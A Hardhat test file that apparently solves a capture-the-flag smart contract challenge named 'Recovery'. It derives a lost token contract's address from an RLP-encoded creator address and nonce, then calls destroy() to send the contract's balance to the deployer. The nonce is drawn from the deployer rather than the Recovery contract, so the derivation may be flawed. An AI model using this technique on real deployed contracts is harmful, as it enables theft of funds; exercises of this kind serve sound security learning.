const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");

describe("test", function () {
    var Recovery;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const RecoveryInstance = await ethers.getContractFactory("Recovery");
        Recovery = await RecoveryInstance.deploy();
    });
    it("hack test", async function () {
        const nonce = await deployer.getTransactionCount();
        const rlp_encoded = ethers.utils.RLP.encode([Recovery.address, ethers.BigNumber.from(nonce).toHexString()]);
        const contract_address_long = ethers.utils.keccak256(rlp_encoded);
        const contract_address = "0x".concat(contract_address_long.substring(26));

        const SimpleTokenInstance = await ethers.getContractFactory("SimpleToken");
        const SimpleToken = await SimpleTokenInstance.attach(ethers.utils.getAddress(contract_address));
        await SimpleToken.destroy(deployer.address);
    });
});
